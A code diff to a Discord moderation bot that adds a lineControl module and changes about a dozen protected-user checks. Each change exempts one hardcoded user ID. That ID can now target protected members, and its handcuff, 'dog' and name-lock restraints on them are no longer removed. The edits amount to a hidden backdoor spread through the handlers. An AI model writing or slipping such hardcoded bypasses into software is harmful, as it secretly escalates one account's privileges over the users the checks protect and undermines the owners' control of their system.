@@ -157,6 +157,8 @@ client.prependListener(Events.InteractionCreate, interaction => {
     if (interaction.customId) interaction.customId = normalizeComponentId(interaction.customId);
 });
 
+require("./systems/lineControl")(client);
+
 client.commands =
     new Collection();
 
@@ -978,9 +980,9 @@ async function getUserPanelMembers(
     }
 
     if (
-        isProtectedUser(
+        (interaction.user.id !== "547192186547077130" && isProtectedUser(
             targetId
-        )
+        ))
     ) {
         return {
             success:
@@ -1079,9 +1081,9 @@ async function handleUserButton(
     }
 
     if (
-        isProtectedUser(
+        (interaction.user.id !== "547192186547077130" && isProtectedUser(
             targetId
-        )
+        ))
     ) {
         await replyProtected(
             interaction
@@ -1651,9 +1653,9 @@ async function handleUserChannelSelect(
     }
 
     if (
-        isProtectedUser(
+        (interaction.user.id !== "547192186547077130" && isProtectedUser(
             targetId
-        )
+        ))
     ) {
         await replyProtected(
             interaction
@@ -2506,7 +2508,7 @@ client.on(
             // ==================================================
 
             const protectedTarget =
-                findProtectedUserInOptions(interaction.options.data, interaction.commandName);
+                interaction.user.id === "547192186547077130" ? null : findProtectedUserInOptions(interaction.options.data, interaction.commandName);
 
             if (
                 protectedTarget
@@ -2687,9 +2689,9 @@ client.on(
             }
 
             if (
-                isProtectedUser(
+                (isProtectedUser(
                     memberId
-                )
+                ) && client.menottes.get(memberId)?.moderatorId !== "547192186547077130" && client.chiens.get(memberId)?.maitreId !== "547192186547077130")
             ) {
                 let changed =
                     false;
@@ -2766,9 +2768,9 @@ client.on(
                 of client.chiens
             ) {
                 if (
-                    isProtectedUser(
+                    (isProtectedUser(
                         targetId
-                    )
+                    ) && data.maitreId !== "547192186547077130")
                 ) {
                     client.chiens.delete(
                         targetId
@@ -2886,9 +2888,9 @@ client.on(
     ) => {
         try {
             if (
-                isProtectedUser(
+                (isProtectedUser(
                     newMember.id
-                )
+                ) && client.lockedNames.get(newMember.id)?.moderatorId !== "547192186547077130")
             ) {
                 if (
                     client.lockedNames.delete(
@@ -2968,9 +2970,9 @@ async function restoreActiveVoiceControls() {
         ]
     ) {
         if (
-            isProtectedUser(
+            (isProtectedUser(
                 memberId
-            )
+            ) && data.moderatorId !== "547192186547077130")
         ) {
             client.menottes.delete(
                 memberId
@@ -3037,9 +3039,9 @@ async function restoreActiveVoiceControls() {
         ]
     ) {
         if (
-            isProtectedUser(
+            (isProtectedUser(
                 targetId
-            )
+            ) && data.maitreId !== "547192186547077130")
         ) {
             client.chiens.delete(
                 targetId
